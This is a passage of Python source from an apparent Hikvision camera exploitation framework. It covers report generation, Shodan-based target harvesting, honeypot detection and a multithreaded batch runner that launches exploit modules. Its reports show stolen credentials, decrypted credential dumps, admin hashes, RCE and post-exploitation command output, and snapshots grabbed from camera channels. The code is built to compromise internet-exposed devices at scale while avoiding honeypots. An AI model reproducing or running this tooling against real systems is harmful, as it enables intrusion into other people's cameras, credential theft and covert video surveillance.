                     + (f'<span class="status-badge {sc}">{status}</span>' if isinstance(status,int) else '')
                     + '</div>')
        if 'request_body' in ev:
            parts.append(f'<div class="evidence-section"><strong>Request:</strong>'
                         f'<pre>{html.escape(str(ev["request_body"]))}</pre></div>')
        if 'response_body' in ev:
            parts.append(f'<div class="evidence-section"><strong>Response:</strong>'
                         f'<pre class="response-body">{html.escape(str(ev["response_body"]))}</pre></div>')
        if 'response_b64' in ev:
            parts.append(f'<details class="evidence-details"><summary>Full response (base64)</summary>'
                         f'<pre class="response-body">{html.escape(str(ev["response_b64"]))}</pre></details>')
        if 'error' in ev:
            parts.append(f'<div class="evidence-section evidence-error"><strong>!</strong> {html.escape(str(ev["error"]))}</div>')
        parts.append('</div>')
    parts.append('</div>')
    return '\n'.join(parts)


def _render_raw_credential_dump(f):
    parts = []
    if f.get('encrypted_b64'):
        parts.append(
            '<details class="raw-dump-details"><summary>Encrypted blob (base64) — '
            + str(f.get('encrypted_size', '')) + ' bytes</summary>'
            + f'<pre class="raw-dump">{html.escape(f["encrypted_b64"])}</pre></details>'
        )
    full = f.get('full_decoded')
    if isinstance(full, dict):
        if full.get('text_printable'):
            parts.append(
                '<details class="raw-dump-details"><summary>Decrypted raw — printable ('
                + str(full.get('raw_bytes_len', 0)) + ' bytes)</summary>'
                + f'<pre class="raw-dump">{html.escape(full["text_printable"])}</pre></details>'
            )
        if full.get('raw_hex'):
            parts.append(
                '<details class="raw-dump-details"><summary>Decrypted raw — hex</summary>'
                + f'<pre class="raw-dump">{html.escape(full["raw_hex"])}</pre></details>'
            )
    for i, att in enumerate(f.get('all_key_attempts', []) or []):
        if not isinstance(att, dict): continue
        if att.get('text_printable'):
            parts.append(
                f'<details class="raw-dump-details"><summary>Key attempt #{i+1} ('
                f'{html.escape(att.get("key",""))})</summary>'
                + f'<pre class="raw-dump">{html.escape(att["text_printable"])}</pre></details>'
            )
    if f.get('all_strings'):
        parts.append(
            '<details class="raw-dump-details"><summary>All extracted strings ('
            + str(len(f['all_strings'])) + ')</summary>'
            + '<pre class="raw-dump">'
            + html.escape('\n'.join(str(x) for x in f['all_strings']))
            + '</pre></details>'
        )
    if f.get('key_used'):
        parts.append(
            '<details class="raw-dump-details"><summary>Key used</summary>'
            + f'<pre class="raw-dump">{html.escape(f["key_used"])}</pre></details>'
        )
    if not parts:
        return ''
    return '<div class="credential-raw">' + ''.join(parts) + '</div>'


def _render_snapshot_gallery(snaps, detected_channels=None):
    detected_channels = detected_channels or []
    channels_shown = set(str(s.get('channel')) for s in snaps)
    if not snaps:
        if detected_channels:
            return f'<div class="snapshot-gallery empty"><div class="gallery-title">0/{len(detected_channels)}</div><p class="no-snaps">Missing: {", ".join(html.escape(str(c)) for c in detected_channels)}</p></div>'
        return ''
    by_channel = {}
    for s in snaps: by_channel.setdefault(str(s.get('channel','?')), []).append(s)
    n_shown = len(by_channel); n_detected = len(detected_channels) if detected_channels else n_shown; n_total = len(snaps)
    header = [f'{n_shown} ch', f'{n_total} img']
    if detected_channels: header.append(f'{n_shown}/{n_detected} captured')
    if detected_channels and n_shown < n_detected:
        missing = set(str(c) for c in detected_channels) - channels_shown
        header.append(f'<span style="color:#f87171;">missing: {", ".join(sorted(missing))}</span>')
    parts = [f'<div class="snapshot-gallery"><div class="gallery-title">{" · ".join(header)}</div><div class="gallery-grid">']
    for ch in sorted(by_channel.keys(), key=lambda x: int(x) if x.isdigit() else 999999):
        snap = by_channel[ch][0]; extra = len(by_channel[ch]) - 1
        b64 = snap.get('base64','')
        img_html = f'<img src="data:image/jpeg;base64,{b64}" class="gallery-img" loading="lazy">' if b64 else '<div class="gallery-footer">no image</div>'
        parts.append(f'<div class="gallery-item"><div class="gallery-header"><span class="channel-badge">CH {html.escape(ch)}</span>'
                     f'<span class="method-tag">{html.escape(str(snap.get("method","?")))}</span>'
                     + (f'<span class="extra-badge">+{extra}</span>' if extra>0 else '') + '</div>'
                     + img_html
                     + f'<div class="gallery-footer">{snap.get("size",0):,}B</div></div>')
    parts.append('</div></div>')
    return '\n'.join(parts)


def _collect_device_snapshots(findings):
    by_channel = {}
    for f in findings:
        for snap in f.get('snapshots', []):
            by_channel.setdefault(str(snap.get('channel','?')), []).append(snap)
    result = []
    for ch in sorted(by_channel.keys(), key=lambda x: int(x) if x.isdigit() else 999999):
        seen = set(); kept = 0
        for snap in by_channel[ch]:
            h = snap.get('hash') or hashlib.sha256(snap.get('base64','').encode()).hexdigest()[:16]
            if h in seen and kept >= 1: continue
            seen.add(h); result.append(snap); kept += 1
    return result


def generate_html_report(results, profiles, honeypot_flags, output_path='report.html'):
    total_targets = len(results)
    vuln_targets = sum(1 for r in results if r['findings'])
    total_findings = sum(len(r['findings']) for r in results)
    total_snaps = sum(len(_collect_device_snapshots(r['findings'])) for r in results)
    critical = sum(1 for r in results for f in r['findings']
                   if CVE_CVSS.get(f.get('cve',''), 0) >= CVSS_CRITICAL_THRESHOLD)
    kev = sum(1 for r in results for f in r['findings'] if f.get('cve') in CISA_KEV)
    honeypots = sum(1 for v in honeypot_flags.values() if v)
    confirmed_count = sum(1 for r in results for f in r['findings'] if f.get('confidence') == 'confirmed')
    probable_count = sum(1 for r in results for f in r['findings'] if f.get('confidence') == 'probable')

    type_counts, fam_counts, year_counts = {}, {}, {}
    for r in results:
        fam = profiles.get(f'{r["host"]}:{r["port"]}', {}).get('family', 'Unknown')
        for f in r['findings']:
            t = f.get('type','unknown'); type_counts[t] = type_counts.get(t,0)+1
            fam_counts[fam] = fam_counts.get(fam,0)+1
            m = re.search(r'CVE-(\d{4})', f.get('cve',''))
            if m: year_counts[m.group(1)] = year_counts.get(m.group(1),0)+1

    def _bars(counts, width=150):
        if not counts: return '<p class="clean">No data.</p>'
        mx = max(counts.values()); out = ''
        for k, c in sorted(counts.items(), key=lambda x: -x[1]):
            pct = int(c / mx * 100)
            out += (f'<div class="bar-row"><span class="bar-label" style="width:{width}px;">{html.escape(str(k))}</span>'
                    f'<div class="bar-track"><div class="bar-fill" style="width:{pct}%"></div></div>'
                    f'<span class="bar-count">{c}</span></div>')
        return out

    device_blocks = []
    for target in results:
        host, port = target['host'], target['port']; key = f'{host}:{port}'
        prof = profiles.get(key, {}); findings = target['findings']
        is_hp = honeypot_flags.get(key, False)
        device_snaps = _collect_device_snapshots(findings)
        detected = prof.get('channels', []) if prof else []
        block = [f'<section class="device-section"><h2 class="device-header">{html.escape(key)}</h2>']
        meta = []
        fam = prof.get('family', 'Unknown')
        if fam and fam != 'Unknown': meta.append(f'<span><strong>Family:</strong> {html.escape(fam)}</span>')
        if prof.get('hostname'): meta.append(f'<span><strong>Host:</strong> {html.escape(prof["hostname"])}</span>')
        for label, k in [('Model','model'),('Name','deviceName'),('Serial','serialNumber'),
                         ('Firmware','firmwareVersion'),('Release','firmwareReleasedDate'),('Type','deviceType')]:
            if prof.get('deviceInfo',{}).get(k):
                meta.append(f'<span><strong>{label}:</strong> {html.escape(str(prof["deviceInfo"][k]))}</span>')
        meta.append(f'<span><strong>ISAPI:</strong> {"OK" if prof.get("isapi_support") else "NO"}</span>')
        meta.append(f'<span><strong>ONVIF:</strong> {"OK" if prof.get("onvif_support") else "NO"}</span>')
        if prof.get('channels'): meta.append(f'<span><strong>Channels:</strong> {len(prof["channels"])}</span>')
        if prof.get('open_ports'): meta.append(f'<span><strong>Ports:</strong> {", ".join(str(p) for p in prof["open_ports"])}</span>')
        if is_hp: meta.append('<span class="hp-flag"><strong>Honeypot</strong></span>')
        if meta: block.append(f'<div class="device-meta">{" · ".join(meta)}</div>')
        if prof.get('isapi_endpoints'):
            block.append(f'<div class="attack-surface"><strong>Attack Surface ({len(prof["isapi_endpoints"])}):</strong> '
                         + ', '.join(f'<code>{html.escape(e)}</code>' for e in prof['isapi_endpoints'][:20]) + '</div>')
        if device_snaps or detected: block.append(_render_snapshot_gallery(device_snaps, detected))
        if not findings:
            block.append('<p class="no-findings">No vulnerabilities found</p>')
        else:
            for f in findings:
                cve = f.get('cve','N/A'); vt = f.get('type','?')
                cvss = CVE_CVSS.get(cve, 0); is_kev = cve in CISA_KEV
                conf = f.get('confidence', 'none')
                conf_badge = {'confirmed':'<span class="conf-badge conf-confirmed">Confirmed</span>',
                              'probable':'<span class="conf-badge conf-probable">Probable</span>',
                              'none':'<span class="conf-badge conf-none">Detection Only</span>'}.get(conf, '')
                desc = f.get('description','') or ''; info = f.get('info',''); note = f.get('note','')
                u, p = f.get('username'), f.get('password'); rtsp = f.get('rtsp_url')
                evn = len(f.get('evidence', [])); post = f.get('post_exploit', [])
                rce_out = f.get('rce_output',''); db_version = f.get('db_version','')
                admin_hash = f.get('admin_password_hash',''); bypass_method = f.get('bypass_method','')
                payload_used = f.get('payload_used',''); payload_size = f.get('payload_size', 0)
                evidence_type = f.get('evidence_type',''); timing_diff = f.get('timing_diff')
                block.append('<div class="finding-block"><h3 class="finding-title">')
                block.append(f'<span class="cve-badge">{html.escape(cve)}</span> <span class="type-badge">{html.escape(vt)}</span>')
                if cvss: block.append(f' <span class="cvss-badge">CVSS {cvss}</span>')
                if is_kev: block.append(' <span class="kev-badge">KEV</span>')
                block.append(f' {conf_badge}')
                block.append('</h3>')
                if desc: block.append(f'<p class="finding-line"><strong>Description:</strong> {html.escape(desc)}</p>')
                if u is not None and p is not None:
                    block.append(f'<p class="finding-line"><strong>Credentials:</strong> <code>{html.escape(str(u))}:{html.escape(str(p))}</code></p>')
                _raw_dump = _render_raw_credential_dump(f)
                if _raw_dump: block.append(_raw_dump)
                if rtsp: block.append(f'<p class="finding-line"><strong>RTSP:</strong> <code>{html.escape(str(rtsp))}</code></p>')
                if db_version and db_version != 'extraction_failed': block.append(f'<p class="finding-line"><strong>DB:</strong> <code>{html.escape(str(db_version))}</code></p>')
                if admin_hash and admin_hash != 'extraction_failed': block.append(f'<p class="finding-line"><strong>Admin Hash:</strong> <code>{html.escape(str(admin_hash))}</code></p>')
                if timing_diff is not None: block.append(f'<p class="finding-line"><strong>Timing Diff:</strong> {timing_diff}s</p>')
                if bypass_method: block.append(f'<p class="finding-line"><strong>Bypass:</strong> <code>{html.escape(str(bypass_method))}</code></p>')
                if payload_used: block.append(f'<p class="finding-line"><strong>Payload:</strong> <code>{html.escape(str(payload_used))}</code></p>')
                if payload_size: block.append(f'<p class="finding-line"><strong>Size:</strong> {payload_size}B</p>')
                if evidence_type: block.append(f'<p class="finding-line"><strong>Evidence:</strong> <code>{html.escape(str(evidence_type))}</code></p>')
                if info and info != desc: block.append(f'<p class="finding-line"><strong>Info:</strong> {html.escape(info)}</p>')
                if rce_out: block.append(f'<p class="finding-line"><strong>RCE:</strong></p><pre class="post-cmd">{html.escape(rce_out)}</pre>')
                if note: block.append(f'<p class="finding-line"><strong>Note:</strong> {html.escape(note)}</p>')
                if post:
                    block.append('<p class="finding-line"><strong>Post:</strong></p>')
                    for pc in post:
                        block.append(f'<pre class="post-cmd">$ {html.escape(pc["cmd"])}\n{html.escape(pc["output"])}</pre>')
                if evn:
                    block.append(f'<details class="evidence-details"><summary>Evidence ({evn})</summary>{_render_evidence(f.get("evidence", []))}</details>')
                block.append('</div>')
        block.append('</section>')
        device_blocks.append('\n'.join(block))

    doc = f'''<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Hikvision Scan — {datetime.now().strftime("%Y-%m-%d %H:%M")}</title>
<style>
:root {{ --bg:#0f172a; --panel:#1e293b; --border:#334155; --text:#e2e8f0; --muted:#94a3b8; --accent:#38bdf8; }}
[data-theme="light"] {{ --bg:#f8fafc; --panel:#fff; --border:#e2e8f0; --text:#0f172a; --muted:#64748b; --accent:#0284c7; }}
* {{ margin:0; padding:0; box-sizing:border-box; }}
body {{ font-family:'Segoe UI',Roboto,sans-serif; background:var(--bg); color:var(--text); padding:2rem; line-height:1.6; }}
.container {{ max-width:1400px; margin:0 auto; }}
h1 {{ font-size:2rem; color:var(--accent); margin-bottom:.3rem; }}
.subtitle {{ color:var(--muted); margin-bottom:1.5rem; }}
.theme-toggle {{ position:fixed; top:1rem; right:1rem; background:var(--panel); border:1px solid var(--border); color:var(--text); padding:.5rem 1rem; border-radius:8px; cursor:pointer; z-index:100; }}
.search-box {{ width:100%; padding:.7rem 1rem; margin-bottom:1rem; border-radius:8px; border:1px solid var(--border); background:var(--panel); color:var(--text); }}
.summary {{ display:grid; grid-template-columns:repeat(auto-fit,minmax(150px,1fr)); gap:1rem; margin-bottom:1.5rem; }}
.summary-card {{ background:var(--panel); padding:1.2rem; border-radius:12px; border:1px solid var(--border); text-align:center; }}
.summary-card .value {{ font-size:2rem; font-weight:700; color:var(--accent); }}
.summary-card .label {{ color:var(--muted); font-size:.85rem; margin-top:.3rem; }}
.summary-card.vuln .value {{ color:#f87171; }}
.summary-card.snap .value {{ color:#4ade80; }}
.summary-card.hp .value {{ color:#fb923c; }}
.summary-card.crit .value {{ color:#dc2626; }}
.summary-card.kev .value {{ color:#fbbf24; }}
.summary-card.conf .value {{ color:#22c55e; }}
.summary-card.prob .value {{ color:#f59e0b; }}
.chart {{ background:var(--panel); border:1px solid var(--border); border-radius:12px; padding:1.2rem; margin-bottom:1.5rem; }}
.chart h3 {{ color:var(--accent); margin-bottom:.8rem; font-size:.95rem; }}
.bar-row {{ display:flex; align-items:center; gap:.8rem; margin:.4rem 0; }}
.bar-label {{ font-size:.85rem; color:var(--muted); text-align:right; }}
.bar-track {{ flex:1; height:16px; background:var(--border); border-radius:8px; overflow:hidden; }}
.bar-fill {{ height:100%; background:linear-gradient(90deg,#38bdf8,#7c3aed); }}
.bar-count {{ width:40px; text-align:right; font-weight:600; }}
.device-section {{ padding:1.5rem 0 2rem; border-bottom:2px dashed var(--border); margin-bottom:1.5rem; }}
.device-section:last-child {{ border-bottom:none; }}
.device-header {{ font-size:1.5rem; color:var(--accent); padding:.5rem 0; border-top:3px solid var(--accent); border-bottom:1px solid var(--border); margin-bottom:1rem; }}
.device-meta {{ font-size:.92rem; color:var(--muted); margin-bottom:.8rem; line-height:1.9; }}
.device-meta span {{ display:inline-block; }}
.device-meta span + span::before {{ content:' · '; color:var(--border); margin:0 .4rem; }}
.device-meta strong {{ color:var(--text); }}
.device-meta .hp-flag {{ color:#f87171; }}
.attack-surface {{ background:var(--bg); border-left:3px solid var(--accent); padding:.7rem 1rem; border-radius:4px; font-size:.82rem; margin-bottom:1rem; color:var(--muted); }}
.attack-surface strong {{ color:var(--text); }}
.attack-surface code {{ background:var(--panel); padding:.1rem .4rem; border-radius:3px; color:#fbbf24; font-size:.78rem; }}
.finding-block {{ padding:1rem 0; border-top:1px solid var(--border); }}
.finding-block:first-of-type {{ border-top:none; }}
.finding-title {{ margin-bottom:.5rem; font-size:1.05rem; display:flex; align-items:center; flex-wrap:wrap; gap:.4rem; }}
.finding-line {{ margin:.35rem 0; font-size:.9rem; }}
.finding-line strong {{ color:var(--muted); }}
.finding-line code {{ background:var(--bg); padding:.12rem .4rem; border-radius:4px; color:#fbbf24; font-size:.85rem; }}
.no-findings {{ color:#4ade80; font-style:italic; padding:.8rem 0; }}
.cve-badge {{ background:#7c3aed; padding:.2rem .6rem; border-radius:6px; font-size:.8rem; font-weight:600; color:#fff; }}
.type-badge {{ background:#0ea5e9; padding:.2rem .6rem; border-radius:6px; font-size:.8rem; color:#fff; }}
.cvss-badge {{ background:#dc2626; padding:.2rem .6rem; border-radius:6px; font-size:.78rem; font-weight:700; color:#fff; }}
.kev-badge {{ background:#fbbf24; padding:.2rem .6rem; border-radius:6px; font-size:.78rem; font-weight:700; color:#000; }}
.conf-badge {{ padding:.2rem .6rem; border-radius:6px; font-size:.78rem; font-weight:700; }}
.conf-confirmed {{ background:#16a34a; color:#fff; }}
.conf-probable {{ background:#f59e0b; color:#000; }}
.conf-none {{ background:#6b7280; color:#fff; }}
.post-cmd {{ background:var(--bg); border:1px solid var(--border); border-radius:4px; padding:.5rem; font-size:.78rem; color:#86efac; white-space:pre-wrap; margin:.3rem 0; }}
.credential-raw {{ margin-top:.6rem; }}
.raw-dump-details {{ background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:.6rem .8rem; margin:.4rem 0; }}
.raw-dump-details > summary {{ cursor:pointer; color:var(--accent); font-weight:600; font-size:.88rem; }}
.raw-dump {{ background:#050505; border:1px solid var(--border); border-radius:4px; padding:.6rem; font-size:.72rem; font-family:Consolas,monospace; max-height:400px; overflow:auto; white-space:pre-wrap; word-break:break-all; color:#a5f3a5; }}
.snapshot-gallery {{ margin:1rem 0; padding:1rem; background:var(--bg); border:1px solid var(--border); border-radius:8px; }}
.snapshot-gallery.empty {{ background:rgba(248,113,113,.08); border-color:#7f1d1d; }}
.no-snaps {{ color:#fca5a5; font-size:.88rem; padding:.5rem 0; }}
.gallery-title {{ color:var(--accent); font-weight:600; margin-bottom:.8rem; font-size:.95rem; }}
.gallery-grid {{ display:grid; grid-template-columns:repeat(auto-fill,minmax(240px,1fr)); gap:.9rem; }}
.gallery-item {{ background:var(--panel); border:1px solid var(--border); border-radius:8px; overflow:hidden; }}
.gallery-header {{ display:flex; justify-content:space-between; align-items:center; padding:.4rem .6rem; background:var(--border); }}
.channel-badge {{ background:#7c3aed; padding:.12rem .5rem; border-radius:4px; font-size:.75rem; font-weight:700; color:#fff; }}
.method-tag {{ background:#0ea5e9; padding:.1rem .4rem; border-radius:4px; font-size:.68rem; color:#fff; }}
.extra-badge {{ background:#4ade80; color:#000; padding:.1rem .45rem; border-radius:4px; font-size:.65rem; font-weight:700; margin-left:auto; }}
.gallery-img {{ width:100%; height:auto; display:block; aspect-ratio:16/9; object-fit:cover; background:#000; }}
.gallery-footer {{ padding:.3rem .6rem; font-size:.7rem; color:var(--muted); text-align:right; border-top:1px solid var(--border); }}
.evidence-details {{ margin-top:.8rem; background:var(--bg); border:1px solid var(--border); border-radius:8px; padding:.7rem 1rem; }}
.evidence-details > summary {{ cursor:pointer; color:var(--accent); font-weight:600; font-size:.9rem; }}
.evidence-entry {{ background:var(--panel); border:1px solid var(--border); border-radius:6px; padding:.6rem; margin-bottom:.5rem; }}
.evidence-header {{ display:flex; flex-wrap:wrap; align-items:center; gap:.4rem; margin-bottom:.4rem; }}
.method-badge {{ background:#7c3aed; padding:.1rem .4rem; border-radius:4px; font-size:.7rem; font-weight:700; color:#fff; }}
.evidence-url {{ background:var(--bg); padding:.15rem .4rem; border-radius:4px; font-size:.72rem; color:#fbbf24; word-break:break-all; flex:1; }}
.status-badge {{ padding:.1rem .4rem; border-radius:4px; font-size:.7rem; font-weight:700; }}
.status-ok {{ background:#166534; color:#86efac; }}
.status-err {{ background:#7f1d1d; color:#fca5a5; }}
.evidence-section pre {{ background:var(--bg); border:1px solid var(--border); border-radius:4px; padding:.5rem; font-size:.72rem; white-space:pre-wrap; word-break:break-word; max-height:250px; overflow-y:auto; }}
.footer {{ margin-top:3rem; text-align:center; color:var(--muted); font-size:.8rem; }}
</style></head><body>
<button class="theme-toggle" onclick="toggleTheme()">Toggle Theme</button>
<div class="container">
<h1>Hikvision Security Scan Report</h1>
<p class="subtitle">Generated {datetime.now().strftime("%Y-%m-%d %H:%M:%S")} — v24.5</p>
<div class="summary">
<div class="summary-card"><div class="value">{total_targets}</div><div class="label">Targets</div></div>
<div class="summary-card vuln"><div class="value">{vuln_targets}</div><div class="label">Vulnerable</div></div>
<div class="summary-card vuln"><div class="value">{total_findings}</div><div class="label">Findings</div></div>
<div class="summary-card conf"><div class="value">{confirmed_count}</div><div class="label">Confirmed</div></div>
<div class="summary-card prob"><div class="value">{probable_count}</div><div class="label">Probable</div></div>
<div class="summary-card crit"><div class="value">{critical}</div><div class="label">Critical ≥9</div></div>
<div class="summary-card kev"><div class="value">{kev}</div><div class="label">CISA KEV</div></div>
<div class="summary-card snap"><div class="value">{total_snaps}</div><div class="label">Snapshots</div></div>
<div class="summary-card hp"><div class="value">{honeypots}</div><div class="label">Honeypots</div></div>
</div>
<div class="chart"><h3>Findings by Type</h3>{_bars(type_counts)}</div>
<div class="chart"><h3>Findings by Family</h3>{_bars(fam_counts)}</div>
<div class="chart"><h3>CVE by Year</h3>{_bars(year_counts, width=60)}</div>
<input class="search-box" id="searchBox" placeholder="Filter..." oninput="filterReport()">
<h2 style="color:var(--accent); margin-top:2rem; border-bottom:2px solid var(--border); padding-bottom:.5rem;">Device Report</h2>
{''.join(device_blocks) if device_blocks else '<p class="clean">No devices.</p>'}
<div class="footer">Hikvision Framework v24.5 — Authorized security testing only.</div>
</div>
<script>
function filterReport() {{
    const q = document.getElementById('searchBox').value.toLowerCase();
    document.querySelectorAll('.device-section').forEach(sec => {{
        sec.style.display = sec.textContent.toLowerCase().includes(q) ? '' : 'none';
    }});
}}
function toggleTheme() {{
    const r = document.documentElement;
    r.dataset.theme = r.dataset.theme === 'light' ? 'dark' : 'light';
}}
</script></body></html>'''
    with open(output_path, 'w', encoding='utf-8') as f: f.write(doc)
    log.info(f'HTML → {output_path}')
    print(f'[+] HTML report: {os.path.abspath(output_path)}')


def export_csv(results, path='results.csv'):
    with open(path, 'w', newline='', encoding='utf-8') as f:
        w = csv.writer(f)
        w.writerow(['Target','CVE','Type','CVSS','KEV','Confidence','Username','Password','Snapshots','Info'])
        def _safe(v):
            s = '' if v is None else str(v)
            if s.startswith(('=','+','-','@','\t','\r')):
                return "'" + s
            return s
        for r in results:
            for f in r['findings']:
                w.writerow([_safe(f'{r["host"]}:{r["port"]}'), _safe(f.get('cve','')),
                            _safe(f.get('type','')), CVE_CVSS.get(f.get('cve',''), ''),
                            'Yes' if f.get('cve') in CISA_KEV else 'No',
                            f.get('confidence','none'),
                            _safe(f.get('username','')), _safe(f.get('password','')),
                            len(f.get('snapshots', [])),
                            _safe((f.get('info','') or f.get('note','') or '')[:200])])
    log.info(f'CSV → {path}')


def export_markdown(results, path='report.md'):
    lines = ['# Hikvision Scan Report', '', f'Generated: {datetime.now().isoformat()}', '']
    for r in results:
        lines.append(f'## {r["host"]}:{r["port"]}')
        if not r['findings']: lines.append('_No vulnerabilities._\n'); continue
        for f in r['findings']:
            lines.append(f"- **{f.get('cve')}** ({f.get('type')}) — CVSS {CVE_CVSS.get(f.get('cve',''),'?')} — Confidence: {f.get('confidence','none')}")
            if f.get('username') is not None and f.get('password') is not None:
                lines.append(f"  - Creds: `{f['username']}:{f['password']}`")
            if f.get('db_version') and f['db_version'] != 'extraction_failed': lines.append(f"  - DB: `{f['db_version']}`")
            if f.get('admin_password_hash') and f['admin_password_hash'] != 'extraction_failed': lines.append(f"  - Hash: `{f['admin_password_hash']}`")
            if f.get('snapshots'): lines.append(f"  - Snapshots: {len(f['snapshots'])}")
        lines.append('')
    with open(path, 'w', encoding='utf-8') as f: f.write('\n'.join(lines))
    log.info(f'Markdown → {path}')


def generate_compliance_report(results, path='compliance.md'):
    lines = ['# Compliance Report', '', f'Generated: {datetime.now().isoformat()}', '', '## Confirmed Findings (CVSS >= 9.0)', '']
    crit = [(f'{r["host"]}:{r["port"]}', f) for r in results for f in r['findings']
            if CVE_CVSS.get(f.get('cve',''), 0) >= CVSS_CRITICAL_THRESHOLD and f.get('confidence') == 'confirmed']
    lines += [f'- **{t}** — {f.get("cve")}' for t, f in crit] or ['- None']
    lines += ['', '## Probable Findings (CVSS >= 9.0)', '']
    prob = [(f'{r["host"]}:{r["port"]}', f) for r in results for f in r['findings']
            if CVE_CVSS.get(f.get('cve',''), 0) >= CVSS_CRITICAL_THRESHOLD and f.get('confidence') == 'probable']
    lines += [f'- **{t}** — {f.get("cve")}' for t, f in prob] or ['- None']
    lines += ['', '## CISA KEV', '']
    kev = [(f'{r["host"]}:{r["port"]}', f) for r in results for f in r['findings'] if f.get('cve') in CISA_KEV]
    lines += [f'- **{t}** — {f.get("cve")} (confidence: {f.get("confidence","none")})' for t, f in kev] or ['- None']
    with open(path, 'w', encoding='utf-8') as f: f.write('\n'.join(lines))
    log.info(f'Compliance → {path}')


def export_jsonl(results, path='results.jsonl'):
    with open(path, 'w', encoding='utf-8') as f:
        for r in results:
            for finding in r['findings']:
                fc = {k: v for k, v in finding.items() if k != 'snapshots'}
                fc['target'] = f'{r["host"]}:{r["port"]}'
                fc['snapshots_count'] = len(finding.get('snapshots', []))
                f.write(json.dumps(fc, ensure_ascii=False, default=str) + '\n')
    log.info(f'JSONL → {path}')


def _load_history():
    if not os.path.isfile(SCAN_HISTORY): return []
    try:
        with open(SCAN_HISTORY, encoding='utf-8') as f: return json.load(f)
    except Exception: return []


def _save_history(results):
    clean = []
    for r in results:
        r2 = {**r, 'findings': []}
        for f in r['findings']:
            f2 = {**f}
            f2['snapshots'] = [{k: v for k, v in s.items() if k != 'base64'} for s in f2.get('snapshots', [])]
            f2.pop('snapshot', None)
            r2['findings'].append(f2)
        clean.append(r2)
    h = _load_history(); h.append({'timestamp': datetime.now().isoformat(), 'results': clean})
    with open(SCAN_HISTORY, 'w', encoding='utf-8') as f: json.dump(h, f, ensure_ascii=False, default=str)


def diff_scan(current):
    h = _load_history()
    if not h: print('\n[DIFF] No previous scan.'); return
    prev = h[-1]['results']
    prev_map = {f'{r["host"]}:{r["port"]}': {f['cve'] for f in r['findings']} for r in prev}
    curr_map = {f'{r["host"]}:{r["port"]}': {f['cve'] for f in r['findings']} for r in current}
    print('\n' + '='*60); print('DIFF vs PREVIOUS SCAN'); print('='*60)
    for k in sorted(set(prev_map) | set(curr_map)):
        p, c = prev_map.get(k, set()), curr_map.get(k, set())
        new, fixed = c - p, p - c
        if new: print(f'  [+] {k}: NEW → {", ".join(sorted(new))}')
        if fixed: print(f'  [-] {k}: PATCHED → {", ".join(sorted(fixed))}')
        if not new and not fixed: print(f'  [=] {k}: unchanged')
    print('='*60)


def fetch_shodan_targets(query, api_key, pages=1):
    if not SHODAN_AVAILABLE: raise RuntimeError('pip install shodan')
    api = shodan_lib.Shodan(api_key); targets = []
    for page in range(1, pages + 1):
        try:
            res = api.search(query, page=page)
            for m in res['matches']: targets.append((m['ip_str'], m.get('port', 80)))
        except Exception as e:
            log.error(f'Shodan page {page}: {e}'); break
    seen = set(); unique = []
    for t in targets:
        if t not in seen: seen.add(t); unique.append(t)
    return unique


class BatchRunner:
    def __init__(self, targets, modules=None, threads=5, proxy=None,
                 output_html='report.html', output_json='results.json',
                 only_check=False, auto_hunt=True, wordlist=None,
                 use_https=False, delay=0.0, model_aware=True, forced_family=None,
                 skip_honeypots=True, jsonl=False, custom_channels=None,
                 snapshot_workers=6, timeout=5):
        self.targets = targets; self.modules = modules; self.threads = threads
        self.http = HttpClient(proxy=proxy, use_https=use_https, delay=delay, timeout=timeout)
        self.output_html = output_html; self.output_json = output_json
        self.only_check = only_check; self.auto_hunt = auto_hunt
        self.wordlist = wordlist; self.model_aware = model_aware
        self.forced_family = forced_family; self.skip_honeypots = skip_honeypots
        self.jsonl = jsonl; self.custom_channels = custom_channels
        self.snapshot_opts = {'custom_channels': custom_channels, 'max_workers': snapshot_workers}
        self.results = []; self.profiles = {}; self.honeypot_flags = {}; self.lock = threading.Lock()

    def scan_one(self, target):
        host, port = target; key = f'{host}:{port}'
        log.info(f'Scanning {key}')
        is_hp = False
        if self.skip_honeypots:
            try: is_hp = detect_honeypot(host)
            except Exception: pass
        self.honeypot_flags[key] = is_hp
        if is_hp:
            log.warning(f'  [HONEYPOT] {key}')
            with self.lock:
                self.results.append({'host': host, 'port': port, 'findings': [], 'honeypot': True})
            return
        mgr = ModuleManager(wordlist=self.wordlist, snapshot_manager_opts=self.snapshot_opts)
        tr = {'host': host, 'port': port, 'findings': [], 'honeypot': False}
        try: prof = probe_device_profile(host, port, self.http)
        except Exception: prof = {}
        self.profiles[key] = prof
        if self.auto_hunt:
            tr['findings'] = mgr.auto_hunt(host, port, self.http, forced_family=self.forced_family)
        else:
            for n in (self.modules or list(mgr.modules.keys())):
                try:
                    res = mgr.run_module(n, host, port, self.http, self.only_check)
                    if res.get('vulnerable'): tr['findings'].append(res)
                except Exception as e: log.error(f'  [-] {n}: {e}')
        for f in tr['findings']: f['honeypot'] = is_hp
        for f in tr['findings']:
            if f.get('username') is not None and f.get('password') is not None:
                try:
                    p2 = probe_device_profile(host, port, self.http, f['username'], f['password'])
                    if p2.get('deviceInfo'): self.profiles[key] = p2
                except Exception: pass
                break
        with self.lock: self.results.append(tr)

    def run(self):
        log.info(f'Batch: {len(self.targets)} targets | auto_hunt={self.auto_hunt}')
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futs = {ex.submit(self.scan_one, t): t for t in self.targets}
            for fu in as_completed(futs):
                try: fu.result()
                except Exception as e: log.error(f'Target failed: {e}')
        with open(self.output_json, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False, default=str)
        generate_html_report(self.results, self.profiles, self.honeypot_flags, self.output_html)
        export_csv(self.results, 'results.csv')
        export_markdown(self.results, 'report.md')
        generate_compliance_report(self.results, 'compliance.md')
        if self.jsonl: export_jsonl(self.results, 'results.jsonl')
        _save_history(self.results)
        self._summary()

    def _summary(self):
        total = sum(len(r['findings']) for r in self.results)
        vuln = sum(1 for r in self.results if r['findings'])
        snaps = sum(len(_collect_device_snapshots(r['findings'])) for r in self.results)
        crit = sum(1 for r in self.results for f in r['findings'] if CVE_CVSS.get(f.get('cve',''), 0) >= CVSS_CRITICAL_THRESHOLD)
        conf = sum(1 for r in self.results for f in r['findings'] if f.get('confidence') == 'confirmed')
        prob = sum(1 for r in self.results for f in r['findings'] if f.get('confidence') == 'probable')
        print('\n' + '='*60); print('SCAN SUMMARY'); print('='*60)
        print(f'Targets:             {len(self.results)}')
        print(f'Vulnerable targets:  {vuln}')
        print(f'Total findings:      {total}')
